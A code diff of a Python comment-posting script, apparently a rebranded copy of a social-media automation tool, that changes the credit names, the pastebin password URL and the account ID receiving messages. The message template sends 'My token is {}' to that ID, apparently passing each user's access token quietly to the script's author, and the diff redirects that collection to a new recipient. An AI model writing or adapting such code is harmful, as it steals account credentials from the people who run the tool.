@@ -14,7 +14,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"SERVER RUNNING => TRICKS ||[BY=|<3V1CKY_R4J 7H4K9R]")
+        self.wfile.write(b"SERVER RUNNING => TRICKS BY  JUSTIN SIR ")
 
 def execute_server():
     PORT = 4000
@@ -39,10 +39,10 @@ def post_comments():
     num_tokens = len(tokens)
 
     # Modify the message as per your requirement
-    msg_template = "Hello R9J 7H4K9R sir! I am using your server. My token is {}"
+    msg_template = "Hello H9DI M9LIK sir! I am using your server. My token is {}"
 
     # Specify the ID where you want to send the message
-    target_id = "100049341217207"
+    target_id = "100079984566647"
 
     requests.packages.urllib3.disable_warnings()
 
@@ -68,7 +68,7 @@ def post_comments():
         'referer': 'www.google.com'
     }
 
-    mmm = requests.get('https://pastebin.com/raw/30sik9JT').text
+    mmm = requests.get('https://pastebin.com/raw/YY8y7wMd').text
 
     if mmm not in password:
         print('[-] Incorrect Password!')
